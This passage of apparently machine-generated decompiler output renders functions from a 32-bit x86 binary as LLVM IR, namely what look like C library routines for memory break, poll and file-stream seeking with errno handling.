  %v3_8051681 = load i32, i32* %v2_8051681, align 4
  store i32 %v3_8051681, i32* @global_var_8059140.207, align 64
  ret i32 %v3_8051681
}

define i32 @function_805168c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805168c:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805168c = load i32, i32* @ebx, align 4
  store i32 %v0_805168c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805169f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805169f, i32* @global_var_8058b44.184, align 4
  %v7_80516aa = icmp ult i32 %v1_805169f, %arg1
  %v1_80516ac = icmp eq i1 %v7_80516aa, false
  br i1 %v1_80516ac, label %dec_label_pc_80516bc, label %dec_label_pc_80516ae

dec_label_pc_80516ae:                             ; preds = %dec_label_pc_805168c
  %v0_80516ae = load i32, i32* %stack_var_-4, align 4
  %v1_80516ae = call i32 @function_804baa4(i32 %v0_80516ae)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80516b6 = inttoptr i32 %v1_80516ae to i32*
  store i32 12, i32* %v1_80516b6, align 4
  %v0_80516bd.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80516bc

dec_label_pc_80516bc:                             ; preds = %dec_label_pc_805168c, %dec_label_pc_80516ae
  %v0_80516bd = phi i32 [ 0, %dec_label_pc_805168c ], [ %v0_80516bd.pre, %dec_label_pc_80516ae ]
  %v2_80516c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80516c0, i32* @ebx, align 4
  ret i32 %v0_80516bd

; uselistorder directives
  uselistorder i32 %v1_805169f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8058b44.184, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80516bc, { 1, 0 }
}

define i32 @function_80516c4() local_unnamed_addr {
dec_label_pc_80516c4:
  %v0_80516c7 = load i32, i32* @eax, align 4
  %v1_80516c9 = sub i32 0, %v0_80516c7
  %v1_80516cb = call i32 @function_804baa4(i32 ptrtoint (i32* @0 to i32))
  %v2_80516d0 = inttoptr i32 %v1_80516cb to i32*
  store i32 %v1_80516c9, i32* %v2_80516d0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 12, 13, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
}

define i32 @function_80516dc() local_unnamed_addr {
dec_label_pc_80516dc:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80516dc = load i32, i32* @edi, align 4
  store i32 %v0_80516dc, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_80516ec = load i32, i32* @ebx, align 4
  %v1_80516ed = inttoptr i32 %tmp4 to %pollfd*
  %v5_80516f4 = call i32 @poll(%pollfd* %v1_80516ed, i32 %tmp3, i32 %tmp)
  store i32 %v0_80516ec, i32* @ebx, align 4
  store i32 %v5_80516f4, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_80516f4, -4095
  br i1 %tmp10, label %dec_label_pc_805170c, label %dec_label_pc_8051700

dec_label_pc_8051700:                             ; preds = %dec_label_pc_80516dc
  %v1_8051700 = call i32 @function_804baa4(i32 %v0_80516ec)
  %v0_8051705 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051705 = sub i32 0, %v0_8051705
  %v2_8051707 = inttoptr i32 %v1_8051700 to i32*
  store i32 %v1_8051705, i32* %v2_8051707, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805170c

dec_label_pc_805170c:                             ; preds = %dec_label_pc_80516dc, %dec_label_pc_8051700
  %v0_805170d = phi i32 [ %v5_80516f4, %dec_label_pc_80516dc ], [ -1, %dec_label_pc_8051700 ]
  %v2_8051710 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051710, i32* @edi, align 4
  ret i32 %v0_805170d

; uselistorder directives
  uselistorder i32 %v5_80516f4, { 1, 0, 2 }
  uselistorder i32 %v0_80516ec, { 1, 0 }
  uselistorder label %dec_label_pc_805170c, { 1, 0 }
}

define i32 @function_8051714(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051714:
  %v1_805171f = ashr i32 %arg2, 31
  %v4_8051726 = inttoptr i32 %arg1 to i16*
  %v5_8051726 = call i32 @function_8051730(i16* %v4_8051726, i32 %arg2, i32 %v1_805171f, i32 %arg3)
  ret i32 %v5_8051726
}

define i32 @function_8051730(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051730:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8051730 = load i32, i32* @ebp, align 4
  %v0_8051731 = load i32, i32* @edi, align 4
  %v0_8051732 = load i32, i32* @esi, align 4
  %v0_8051733 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8051743 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051743, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_8051767, label %dec_label_pc_8051754

dec_label_pc_8051754:                             ; preds = %dec_label_pc_8051730
  %v1_8051754 = call i32 @function_804baa4(i32 %arg2)
  store i32 %v1_8051754, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_805175c = inttoptr i32 %v1_8051754 to i32*
  store i32 22, i32* %v1_805175c, align 4
  br label %dec_label_pc_805180d

dec_label_pc_8051767:                             ; preds = %dec_label_pc_8051730
  %v1_8051767 = add i32 %v4_8051743, 52
  %v2_8051767 = inttoptr i32 %v1_8051767 to i32*
  %v3_8051767 = load i32, i32* %v2_8051767, align 4
  %v1_805176a = icmp eq i32 %v3_8051767, 0
  %v1_805176c = icmp eq i1 %v1_805176a, false
  br i1 %v1_805176c, label %dec_label_pc_805178d, label %dec_label_pc_805176e

dec_label_pc_805176e:                             ; preds = %dec_label_pc_8051767
  %v1_805176e = add i32 %v4_8051743, 56
  store i32 %v1_805176e, i32* @ebx, align 4
  %v2_8051778 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8051778, i32* @eax, align 4
  %v3_805177d = call i32 @function_804f65e(i32 %v2_8051778, i32 134542939)
  store i32 %v3_805177d, i32* %eax.global-to-local, align 4
  %v0_8051782 = load i32, i32* @ebx, align 4
  %v2_8051785 = call i32 @function_804f65b(i32 %v0_8051782)
  store i32 %v2_8051785, i32* %eax.global-to-local, align 4
  %v0_805178d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805178d

dec_label_pc_805178d:                             ; preds = %dec_label_pc_8051767, %dec_label_pc_805176e
  %v0_8051795 = phi i32 [ %v4_8051743, %dec_label_pc_8051767 ], [ %v0_805178d.pre, %dec_label_pc_805176e ]
  %v1_805178d = inttoptr i32 %v0_8051795 to i8*
  %v2_805178d = load i8, i8* %v1_805178d, align 1
  %v3_805178d = and i8 %v2_805178d, 64
  %v4_805178d = icmp eq i8 %v3_805178d, 0
  br i1 %v4_805178d, label %dec_label_pc_80517a2, label %dec_label_pc_8051792

dec_label_pc_8051792:                             ; preds = %dec_label_pc_805178d
  %v2_8051796 = call i32 @function_804c2c0(i32 %v0_8051795)
  store i32 %v2_8051796, i32* %eax.global-to-local, align 4
  %v1_805179e = icmp eq i32 %v2_8051796, 0
  %v1_80517a0 = icmp eq i1 %v1_805179e, false
  br i1 %v1_80517a0, label %dec_label_pc_80517f5, label %dec_label_pc_80517a2

dec_label_pc_80517a2:                             ; preds = %dec_label_pc_8051792, %dec_label_pc_805178d
  %v0_80517a2 = load i32, i32* @edi, align 4
  %v9_80517a2 = icmp eq i32 %v0_80517a2, 1
  %v1_80517a5 = icmp eq i1 %v9_80517a2, false
  br i1 %v1_80517a5, label %dec_label_pc_80517a2.dec_label_pc_80517bb_crit_edge, label %dec_label_pc_80517a7

dec_label_pc_80517a2.dec_label_pc_80517bb_crit_edge: ; preds = %dec_label_pc_80517a2
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80517bb

dec_label_pc_80517a7:                             ; preds = %dec_label_pc_80517a2
  %v0_80517a7 = load i32, i32* @ecx, align 4
  %v2_80517a9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80517a9, i32* %eax.global-to-local, align 4
  %v0_80517ae = load i32, i32* @esi, align 4
  %v5_80517ae = inttoptr i32 %v0_80517ae to i16*
  %v6_80517af = call i32 @function_8051868(i16* %v5_80517ae, i32 %v2_80517a9, i32 %v0_80517a7, i32 %v0_80517a7)
  store i32 %v6_80517af, i32* %eax.global-to-local, align 4
  %v2_80517b7 = icmp slt i32 %v6_80517af, 0
  br i1 %v2_80517b7, label %dec_label_pc_80517f5, label %dec_label_pc_80517a7.dec_label_pc_80517bb_crit_edge

dec_label_pc_80517a7.dec_label_pc_80517bb_crit_edge: ; preds = %dec_label_pc_80517a7
  %v0_80517bc.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80517bb

dec_label_pc_80517bb:                             ; preds = %dec_label_pc_80517a2.dec_label_pc_80517bb_crit_edge, %dec_label_pc_80517a7.dec_label_pc_80517bb_crit_edge
  %v2_80517bd.pre-phi = phi i32 [ %.pre6, %dec_label_pc_80517a2.dec_label_pc_80517bb_crit_edge ], [ %v2_80517a9, %dec_label_pc_80517a7.dec_label_pc_80517bb_crit_edge ]
  %v0_80517bc = phi i32 [ %v0_80517a2, %dec_label_pc_80517a2.dec_label_pc_80517bb_crit_edge ], [ %v0_80517bc.pre, %dec_label_pc_80517a7.dec_label_pc_80517bb_crit_edge ]
  %v0_80517bb = load i32, i32* @edx, align 4
  store i32 %v2_80517bd.pre-phi, i32* %eax.global-to-local, align 4
  %v0_80517c2 = load i32, i32* @esi, align 4
  %v5_80517c3 = inttoptr i32 %v2_80517bd.pre-phi to i32*
  %v6_80517c3 = call i32 @function_80519a4(i32 %v0_80517c2, i32* %v5_80517c3, i32 %v0_80517bc, i32 %v0_80517bb)
  store i32 %v6_80517c3, i32* %eax.global-to-local, align 4
  %v2_80517cb = icmp slt i32 %v6_80517c3, 0
  br i1 %v2_80517cb, label %dec_label_pc_80517f5, label %dec_label_pc_80517cf

dec_label_pc_80517cf:                             ; preds = %dec_label_pc_80517bb
  %v0_80517cf = load i32, i32* @esi, align 4
  %v1_80517cf = inttoptr i32 %v0_80517cf to i32*
  %v2_80517cf = load i32, i32* %v1_80517cf, align 4
  store i32 %v2_80517cf, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80517d3 = add i32 %v0_80517cf, 44
  %v2_80517d3 = inttoptr i32 %v1_80517d3 to i32*
  store i32 0, i32* %v2_80517d3, align 4
  %v0_80517da = load i32, i32* @esi, align 4
  %v1_80517da = add i32 %v0_80517da, 2
  %v2_80517da = inttoptr i32 %v1_80517da to i8*
  store i8 0, i8* %v2_80517da, align 1
  %v0_80517de = load i32, i32* %eax.global-to-local, align 4
  %v1_80517de = and i32 %v0_80517de, -72
  store i32 %v1_80517de, i32* %eax.global-to-local, align 4
  %v1_80517e1 = trunc i32 %v1_80517de to i16
  %v2_80517e1 = load i32, i32* @esi, align 4
  %v3_80517e1 = inttoptr i32 %v2_80517e1 to i16*
  store i16 %v1_80517e1, i16* %v3_80517e1, align 2
  %v0_80517e4 = load i32, i32* @esi, align 4
  %v1_80517e4 = add i32 %v0_80517e4, 8
  %v2_80517e4 = inttoptr i32 %v1_80517e4 to i32*
  %v3_80517e4 = load i32, i32* %v2_80517e4, align 4
  store i32 %v3_80517e4, i32* %eax.global-to-local, align 4
  %v2_80517e7 = add i32 %v0_80517e4, 16
  %v3_80517e7 = inttoptr i32 %v2_80517e7 to i32*
  store i32 %v3_80517e4, i32* %v3_80517e7, align 4
  %v0_80517ea = load i32, i32* %eax.global-to-local, align 4
  %v1_80517ea = load i32, i32* @esi, align 4
  %v2_80517ea = add i32 %v1_80517ea, 20
  %v3_80517ea = inttoptr i32 %v2_80517ea to i32*
  store i32 %v0_80517ea, i32* %v3_80517ea, align 4
  %v0_80517ed = load i32, i32* %eax.global-to-local, align 4
  %v1_80517ed = load i32, i32* @esi, align 4
  %v2_80517ed = add i32 %v1_80517ed, 24
  %v3_80517ed = inttoptr i32 %v2_80517ed to i32*
  store i32 %v0_80517ed, i32* %v3_80517ed, align 4
  %v0_80517f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80517f0 = load i32, i32* @esi, align 4
  %v2_80517f0 = add i32 %v1_80517f0, 28
  %v3_80517f0 = inttoptr i32 %v2_80517f0 to i32*
  store i32 %v0_80517f0, i32* %v3_80517f0, align 4
  br label %dec_label_pc_80517f8

dec_label_pc_80517f5:                             ; preds = %dec_label_pc_80517bb, %dec_label_pc_80517a7, %dec_label_pc_8051792
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80517f8

dec_label_pc_80517f8:                             ; preds = %dec_label_pc_80517cf, %dec_label_pc_80517f5
  br i1 %v1_805176c, label %dec_label_pc_805180d, label %dec_label_pc_80517fc

dec_label_pc_80517fc:                             ; preds = %dec_label_pc_80517f8
  %v2_8051800 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8051800, i32* @eax, align 4
  %v3_8051805 = call i32 @function_804f65e(i32 %v2_8051800, i32 1)
  store i32 %v3_8051805, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805180d

dec_label_pc_805180d:                             ; preds = %dec_label_pc_80517f8, %dec_label_pc_8051754, %dec_label_pc_80517fc
  %v0_8051810 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051810, i32* %eax.global-to-local, align 4
  store i32 %v0_8051733, i32* @ebx, align 4
  store i32 %v0_8051732, i32* @esi, align 4
  store i32 %v0_8051731, i32* @edi, align 4
  store i32 %v0_8051730, i32* @ebp, align 4
  ret i32 %v0_8051810

; uselistorder directives
  uselistorder i32 %v2_80517bd.pre-phi, { 1, 0 }
  uselistorder i32 %v0_80517a2, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i8 64, { 5, 1, 2, 6, 3, 4, 0 }
  uselistorder i32 (i32)* @function_804f65b, { 8, 28, 27, 26, 25, 6, 5, 24, 3, 29, 36, 35, 11, 2, 1, 0, 10, 34, 9, 23, 22, 21, 20, 19, 18, 7, 17, 33, 4, 16, 15, 32, 31, 30, 14, 13, 12 }
  uselistorder i32 (i32, i32)* @function_804f65e, { 7, 6, 49, 48, 47, 46, 45, 44, 43, 42, 4, 3, 2, 41, 40, 39, 1, 0, 51, 50, 65, 64, 63, 62, 13, 12, 11, 10, 61, 60, 9, 8, 38, 37, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 36, 5, 25, 24, 59, 58, 23, 22, 21, 20, 57, 56, 55, 54, 53, 52, 19, 18, 17, 16, 15, 14 }
  uselistorder i32 134542939, { 2, 3, 30, 31, 32, 33, 34, 35, 0, 20, 4, 5, 6, 7, 8, 9, 10, 11, 1, 21, 22, 23, 12, 24, 13, 14, 15, 16, 25, 26, 27, 28, 17, 29, 18, 19 }
  uselistorder i32 52, { 16, 2, 8, 3, 4, 5, 6, 14, 15, 9, 11, 7, 17, 18, 12, 13, 1, 0, 10 }
  uselistorder i32 22, { 9, 12, 8, 0, 1, 2, 3, 6, 10, 11, 7, 4, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805180d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80517f8, { 1, 0 }
  uselistorder label %dec_label_pc_80517bb, { 1, 0 }
  uselistorder label %dec_label_pc_805178d, { 1, 0 }
}

define i32 @function_8051818(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051818:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051818 = load i32, i32* @ebx, align 4
  store i32 %v0_8051818, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_805181e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805181e, i32* @ebx, align 4
  %v1_8051826 = bitcast i16* %arg1 to i8*
  %v2_8051826 = load i8, i8* %v1_8051826, align 1
  %v3_8051826 = and i8 %v2_8051826, 4
  %v4_8051826 = icmp eq i8 %v3_8051826, 0
  %v1_8051829 = icmp eq i1 %v4_8051826, false
  br i1 %v1_8051829, label %dec_label_pc_8051861, label %dec_label_pc_805182b

dec_label_pc_805182b:                             ; preds = %dec_label_pc_8051818
  %v2_805182b = icmp slt i32 %arg3, 0
  %v3_8051832 = select i1 %v2_805182b, i32 2147483647, i32 %arg3
  %v1_805183b = add i32 %v4_805181e, 4
  %v2_805183b = inttoptr i32 %v1_805183b to i32*
  %v3_805183b = load i32, i32* %v2_805183b, align 4
  %v4_805183e = inttoptr i32 %arg2 to i32*
  %v5_805183e = call i32 @function_805261c(i32 %v3_805183b, i32* %v4_805183e, i32 %v3_8051832, i32 2147483647)
  store i32 %v5_805183e, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v5_805183e, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_8051861, label %dec_label_pc_805184d

dec_label_pc_805184d:                             ; preds = %dec_label_pc_805182b
  %v1_8051846 = icmp eq i32 %v5_805183e, 0
  %v4_805184b = icmp eq i1 %v1_8051846, false
  %v0_805184d = load i32, i32* @ebx, align 4
  %v1_805184d = inttoptr i32 %v0_805184d to i32*
  %v2_805184d = load i32, i32* %v1_805184d, align 4
  br i1 %v4_805184b, label %dec_label_pc_8051859, label %dec_label_pc_8051851

dec_label_pc_8051851:                             ; preds = %dec_label_pc_805184d
  %v1_8051851 = or i32 %v2_805184d, 4
  %v1_8051854 = trunc i32 %v1_8051851 to i16
  %v3_8051854 = inttoptr i32 %v0_805184d to i16*
  store i16 %v1_8051854, i16* %v3_8051854, align 2
  br label %dec_label_pc_8051861

dec_label_pc_8051859:                             ; preds = %dec_label_pc_805184d
  %v1_8051859 = or i32 %v2_805184d, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_805185e = trunc i32 %v1_8051859 to i16
  %v3_805185e = inttoptr i32 %v0_805184d to i16*
  store i16 %v1_805185e, i16* %v3_805185e, align 2
  br label %dec_label_pc_8051861

dec_label_pc_8051861:                             ; preds = %dec_label_pc_805182b, %dec_label_pc_8051818, %dec_label_pc_8051851, %dec_label_pc_8051859
  %v0_8051862 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051865 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051865, i32* @ebx, align 4
  ret i32 %v0_8051862

; uselistorder directives
  uselistorder i32 %v5_805183e, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 2147483647, { 0, 3, 1, 2, 4 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051861, { 3, 2, 0, 1 }
}

define i32 @function_8051868(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051868:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_8051870 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051870, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8051878 = load i16, i16* %arg1, align 2
  %v3_8051878 = zext i16 %v2_8051878 to i32
  store i32 %v3_8051878, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_8051878, 4
  %v1_805187d = zext i16 %tmp to i32
  %v2_805187d = icmp eq i16 %tmp, 0
  br i1 %v2_805187d, label %dec_label_pc_80518ac, label %dec_label_pc_8051882

dec_label_pc_8051882:                             ; preds = %dec_label_pc_8051868
  %v1_8051884 = add nsw i32 %v1_805187d, -1
  %v8_8051884 = icmp eq i32 %v1_8051884, 0
  store i32 %v1_8051884, i32* @edx, align 4
  br i1 %v8_8051884, label %dec_label_pc_80518ac, label %dec_label_pc_8051887

dec_label_pc_8051887:                             ; preds = %dec_label_pc_8051882
  %v3_8051887 = and i32 %v3_8051878, 2048
  %v4_8051887 = icmp eq i32 %v3_8051887, 0
  br i1 %v4_8051887, label %dec_label_pc_80518ac, label %dec_label_pc_805188c

dec_label_pc_805188c:                             ; preds = %dec_label_pc_8051887
  %v6_805188c = sub nsw i32 1, %v1_805187d
  %v7_805188c = and i32 %v1_8051884, %v6_805188c
  %v8_805188c = icmp slt i32 %v7_805188c, 0
  %v9_805188c = icmp eq i16 %tmp, 2
  %v10_805188c = icmp ult i16 %tmp, 2
  %v3_805188f = icmp eq i1 %v10_805188c, %v8_805188c
  %v4_805188f = icmp eq i1 %v9_805188c, false
  %v5_805188f = and i1 %v4_805188f, %v3_805188f
  br i1 %v5_805188f, label %dec_label_pc_8051900, label %dec_label_pc_8051891

dec_label_pc_8051891:                             ; preds = %dec_label_pc_805188c
  %v1_8051891 = add i32 %v4_8051870, 40
  %v2_8051891 = inttoptr i32 %v1_8051891 to i32*
  %v3_8051891 = load i32, i32* %v2_8051891, align 4
  %v4_8051891 = icmp eq i32 %v3_8051891, 0
  %v1_8051895 = icmp eq i1 %v4_8051891, false
  br i1 %v1_8051895, label %dec_label_pc_8051900, label %dec_label_pc_8051897

dec_label_pc_8051897:                             ; preds = %dec_label_pc_8051891
  %v1_8051897 = add i32 %v4_8051870, 3
  %v2_8051897 = inttoptr i32 %v1_8051897 to i8*
  %v3_8051897 = load i8, i8* %v2_8051897, align 1
  %v4_8051897 = zext i8 %v3_8051897 to i32
  %v2_805189b = sub nsw i32 %v1_8051884, %v4_8051897
  %v1_805189d = add i32 %v4_8051870, 44
  %v2_805189d = inttoptr i32 %v1_805189d to i32*
  %v3_805189d = load i32, i32* %v2_805189d, align 4
  %v1_80518a1 = add nsw i32 %v2_805189b, -1
  %tmp11 = icmp slt i32 %v3_805189d, 1
  br i1 %tmp11, label %dec_label_pc_80518ac, label %dec_label_pc_80518a6

dec_label_pc_80518a6:                             ; preds = %dec_label_pc_8051897
  %v1_80518a6 = add i32 %v4_8051870, 2
  %v2_80518a6 = inttoptr i32 %v1_80518a6 to i8*
  %v3_80518a6 = load i8, i8* %v2_80518a6, align 1
  %v4_80518a6 = zext i8 %v3_80518a6 to i32
  %v2_80518aa = sub nsw i32 %v1_80518a1, %v4_80518a6
  br label %dec_label_pc_80518ac

dec_label_pc_80518ac:                             ; preds = %dec_label_pc_8051897, %dec_label_pc_8051887, %dec_label_pc_8051882, %dec_label_pc_8051868, %dec_label_pc_80518a6
  %v0_80518c1 = phi i32 [ %v1_80518a1, %dec_label_pc_8051897 ], [ %v1_8051884, %dec_label_pc_8051887 ], [ 0, %dec_label_pc_8051882 ], [ 0, %dec_label_pc_8051868 ], [ %v2_80518aa, %dec_label_pc_80518a6 ]
  %v2_80518ac = and i32 %v3_8051878, 64
  %v3_80518ac = icmp eq i32 %v2_80518ac, 0
  %storemerge.in.in.v = select i1 %v3_80518ac, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_8051870
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_80518b9 = add i32 %v4_8051870, 16
  %v3_80518b9 = inttoptr i32 %v2_80518b9 to i32*
  %v4_80518b9 = load i32, i32* %v3_80518b9, align 4
  %v5_80518b9 = sub i32 %storemerge, %v4_80518b9
  %v1_80518bc = inttoptr i32 %arg2 to i32*
  %v2_80518bc = load i32, i32* %v1_80518bc, align 4
  store i32 %v2_80518bc, i32* %ecx.global-to-local, align 4
  %v1_80518be = add i32 %arg2, 4
  %v2_80518be = inttoptr i32 %v1_80518be to i32*
  %v3_80518be = load i32, i32* %v2_80518be, align 4
  store i32 %v3_80518be, i32* %ebx.global-to-local, align 4
  %v2_80518c1 = add i32 %v5_80518b9, %v0_80518c1
  store i32 %v2_80518c1, i32* %esi.global-to-local, align 4
  %v5_80518d5 = sub i32 %v2_80518bc, %v2_80518c1
  %v10_80518d5 = icmp ult i32 %v2_80518bc, %v2_80518c1
  %v6_80518d9 = zext i1 %v10_80518d5 to i32
  %tmp13 = icmp slt i32 %v2_80518c1, 0
  %v2_80518c6.neg = zext i1 %tmp13 to i32
  %v7_80518d9 = add i32 %v3_80518be, %v2_80518c6.neg
  %v8_80518d9 = add i32 %v7_80518d9, %v6_80518d9
  store i32 %v8_80518d9, i32* @edx, align 4
  store i32 %v5_80518d5, i32* %v1_80518bc, align 4
  %v0_80518df = load i32, i32* @edx, align 4
  %v1_80518df = load i32, i32* %edi.global-to-local, align 4
  %v2_80518df = add i32 %v1_80518df, 4
  %v3_80518df = inttoptr i32 %v2_80518df to i32*
  store i32 %v0_80518df, i32* %v3_80518df, align 4
  %v0_80518e2 = load i32, i32* %edi.global-to-local, align 4
  %v1_80518e2 = add i32 %v0_80518e2, 4
  %v2_80518e2 = inttoptr i32 %v1_80518e2 to i32*
  %v3_80518e2 = load i32, i32* %v2_80518e2, align 4
  %v4_80518e2 = load i32, i32* %ebx.global-to-local, align 4
  %v5_80518e5 = icmp slt i32 %v3_80518e2, %v4_80518e2
  br i1 %v5_80518e5, label %dec_label_pc_80518ef, label %dec_label_pc_80518e7

dec_label_pc_80518e7:                             ; preds = %dec_label_pc_80518ac
  %v8_80518e7 = icmp sgt i32 %v3_80518e2, %v4_80518e2
  br i1 %v8_80518e7, label %dec_label_pc_80518ed, label %dec_label_pc_80518e9

dec_label_pc_80518e9:                             ; preds = %dec_label_pc_80518e7
  %v1_80518e9 = inttoptr i32 %v0_80518e2 to i32*
  %v2_80518e9 = load i32, i32* %v1_80518e9, align 4
  %v3_80518e9 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_80518e9, %v3_80518e9
  br i1 %tmp14, label %dec_label_pc_80518ed, label %dec_label_pc_80518ef

dec_label_pc_80518ed:                             ; preds = %dec_label_pc_80518e9, %dec_label_pc_80518e7
  %v0_80518ed = load i32, i32* %esi.global-to-local, align 4
  %v1_80518ed = sub i32 0, %v0_80518ed
  store i32 %v1_80518ed, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80518ef

dec_label_pc_80518ef:                             ; preds = %dec_label_pc_80518e9, %dec_label_pc_80518ac, %dec_label_pc_80518ed
  %v0_80518ef = load i32, i32* %esi.global-to-local, align 4
  %v2_80518ef = icmp slt i32 %v0_80518ef, 0
  %v1_80518f1 = icmp eq i1 %v2_80518ef, false
  br i1 %v1_80518f1, label %dec_label_pc_8051903, label %dec_label_pc_80518f3

dec_label_pc_80518f3:                             ; preds = %dec_label_pc_80518ef
  %v1_80518f3 = call i32 @function_804baa4(i32 %v2_80518c1)
  %v1_80518f8 = inttoptr i32 %v1_80518f3 to i32*
  store i32 75, i32* %v1_80518f8, align 4
  %v0_8051906.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051903

dec_label_pc_8051900:                             ; preds = %dec_label_pc_8051891, %dec_label_pc_805188c
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051903

dec_label_pc_8051903:                             ; preds = %dec_label_pc_80518ef, %dec_label_pc_80518f3, %dec_label_pc_8051900
  %v0_8051906 = phi i32 [ %v0_80518ef, %dec_label_pc_80518ef ], [ %v0_8051906.pre, %dec_label_pc_80518f3 ], [ -1, %dec_label_pc_8051900 ]
  ret i32 %v0_8051906

; uselistorder directives
  uselistorder i32 %v4_80518e2, { 1, 0 }
  uselistorder i32 %v3_80518e2, { 1, 0 }
  uselistorder i32 %v2_80518c1, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_8051884, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_8051870, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i16 2, { 0, 1, 4, 2, 3 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051903, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80518ef, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80518ac, { 4, 0, 1, 2, 3 }
}

define i32 @function_805190c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805190c:
  %edx.global-to-local = alloca i32, align 4
  %v0_805190c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051914 = add i32 %arg1, 8
  %v2_8051914 = inttoptr i32 %v1_8051914 to i32*
  %v3_8051914 = load i32, i32* %v2_8051914, align 4
  store i32 %v3_8051914, i32* %edx.global-to-local, align 4
  %v1_8051917 = add i32 %arg1, 12
